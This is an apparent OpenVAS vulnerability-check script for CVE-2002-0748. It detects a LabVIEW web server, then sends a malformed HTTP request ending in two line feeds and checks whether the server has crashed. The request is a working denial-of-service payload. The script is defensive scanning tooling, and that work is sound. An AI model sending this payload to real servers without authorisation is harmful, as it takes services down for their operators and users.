# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11063");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/4577");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-0748");
  script_name("LabView web server DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_require_ports("Services/www", 80);
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("LabVIEW/banner");

  script_tag(name:"summary", value:"It was possible to kill the web server by
  sending a request that ends with two LF characters instead of
  the normal sequence CR LF CR LF (CR = carriage return, LF = line feed).");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make
  this server and all LabViews applications crash continually.");

  script_tag(name:"solution", value:"Upgrade your LabView software or run the web server with logging
  disabled.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
banner = http_get_remote_headers(port:port);
if(!banner || "Server: LabVIEW" >!< banner)
  exit(0);

if(http_is_dead(port: port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

data = string("GET / HTTP/1.0\n\n");

send(socket:soc, data:data);
http_recv(socket:soc);
close(soc);

sleep(1);

if(http_is_dead(port:port, retry:2)) {
  security_message(port:port);
  exit(0);
}

exit(99);
